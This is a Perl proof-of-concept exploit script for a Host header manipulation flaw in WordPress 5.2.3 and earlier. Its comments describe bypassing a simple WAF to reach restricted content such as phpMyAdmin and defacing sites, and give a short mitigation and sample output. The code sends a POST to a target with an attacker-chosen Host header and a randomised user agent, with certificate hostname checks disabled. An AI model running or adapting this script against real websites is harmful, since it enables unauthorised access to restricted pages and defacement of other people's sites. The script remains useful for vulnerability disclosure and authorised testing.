#!/usr/bin/perl -w
#
#  Wordpress <= 5.2.3 Remote Cross Site Host Modification Proof Of Concept Demo Exploit
#
#  Copyright 2019 (c) Todor Donev <todor.donev at gmail.com>
#
#  Type: Remote
#  Risk: High
#
#  Solution:
#  Set security headers to web server and no-cache for Cache-Control
#
#  Simple Attack Scenarios:
#
#     o  This attack can bypass Simple WAF to access restricted content on the web server,
#        something like phpMyAdmin;
#
#     o  This attack can deface the vulnerable Wordpress website with content from the default vhost;
#
#  Disclaimer:
#  This or previous programs are for Educational purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages
#  caused by direct or indirect use of the  information or functionality provided by these programs.
#  The author or any Internet provider  bears NO responsibility for content or misuse of these programs
#  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss,
#  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's
#  responsibility.
#
#  Use them at your own risk!
#
#       # Wordpress <= 5.2.3 Remote Cross Site Host Modification Proof Of Concept Demo Exploit
#	# ====================================================================================
#	# Author: Todor Donev 2019 (c) <todor.donev at gmail.com>
#	# >  Host => default-vhost.com
#	# >  User-Agent => Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)
#	# >  Content-Type => application/x-www-form-urlencoded
#	# <  Connection => close
#	# <  Date => Fri, 06 Sep 2019 11:39:43 GMT
#	# <  Location => https://default-vhost.com/
#	# <  Server => nginx
#	# <  Content-Type => text/html; charset=UTF-8
#	# <  Client-Date => Fri, 06 Sep 2019 11:39:43 GMT
#	# <  Client-Peer => 13.37.13.37:443
#	# <  Client-Response-Num => 1
#	# <  Client-SSL-Cert-Issuer => /C=US/O=Let's Encrypt/CN=Let's Encrypt Authority X3
#	# <  Client-SSL-Cert-Subject => /CN=default-vhost.com
#	# <  Client-SSL-Cipher => ECDHE-RSA-AES256-GCM-SHA384
#	# <  Client-SSL-Socket-Class => IO::Socket::SSL
#	# <  Client-SSL-Warning => Peer certificate not verified
#	# <  Client-Transfer-Encoding => chunked
#	# <  Strict-Transport-Security => max-age=31536000;
#	# <  X-Powered-By => PHP/7.3.9
#	# <  X-Redirect-By => WordPress
#	# ====================================================================================
#
#
#
use strict;
use v5.10;
use HTTP::Request;
use LWP::UserAgent;
use WWW::UserAgent::Random;


my $host = shift || '';
my $attacker = shift || 'default-vhost.com';


say "# Wordpress <= 5.2.3 Remote Cross Site Host Modification Proof Of Concept Demo Exploit
# ====================================================================================
# Author: Todor Donev 2019 (c) <todor.donev at gmail.com>";
if ($host !~ m/^http/){
say  "# e.g. perl $0 https://target:port/ default-vhost.com";
exit;
}

my $user_agent = rand_ua("browsers");
my $browser  = LWP::UserAgent->new(
                                        protocols_allowed => ['http', 'https'],
                                        ssl_opts => { verify_hostname => 0 }
                                );
   $browser->timeout(10);
   $browser->agent($user_agent);

my $request = HTTP::Request->new (POST => $host,[Content_Type => "application/x-www-form-urlencoded"], " ");
$request->header("Host" => $attacker);
my $response = $browser->request($request);
say "# 401 Unauthorized!\n" and exit if ($response->code eq '401');
say "# >  $_ => ", $request->header($_) for  $request->header_field_names;
say "# <  $_ => ", $response->header($_) for  $response->header_field_names;
say "# ====================================================================================";